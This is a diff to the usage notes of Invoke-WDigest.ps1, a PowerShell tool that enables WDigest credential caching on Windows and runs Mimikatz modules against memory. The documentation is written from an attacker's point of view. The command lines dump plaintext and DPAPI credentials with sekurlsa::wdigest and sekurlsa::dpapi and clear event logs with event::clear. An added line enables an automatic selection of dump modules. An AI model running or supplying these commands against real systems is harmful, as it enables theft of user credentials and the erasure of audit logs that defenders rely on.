@@ -44,8 +44,11 @@ Get-Help .\Invoke-WDigest.ps1 -full
 # Execute Mimikatz (multiple dump::modules) without WDigest caching
 .\Invoke-WDigest.ps1 -wdigest 'false' -manycats -module 'net::group sekurlsa::wdigest sekurlsa::dpapi event::clear exit'
 
+#  Ativate WDigest caching + Exec M[i]mika[t]z pre-sellection of dump::modules
+.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'auto'
 
-[FAST DEMONSTRATION]
+
+[WDIGEST CATCHING FAST DEMONSTRATION]
 
 ## WDigest caching + dump (-runas) created credential with mimikatz
 .\Invoke-WDigest.ps1 -WDigest 'true' -manycats -runas
@@ -62,8 +65,7 @@ REMARK
    in a minimized windows (detach from parent). Child process its necessary
    for mimikatz 'sekurlsa::wdigest' to dump the credential from Memory.
    
-   [Downside] Cmdlet does not continue execution while the credential its not input, from one
-   remote atacker point of view thats bad ( cmdlet execution paused because of -runas command )
+   [Downside] -runas pauses cmdlet execution while the credential its not input.
 ```
 
 <br />
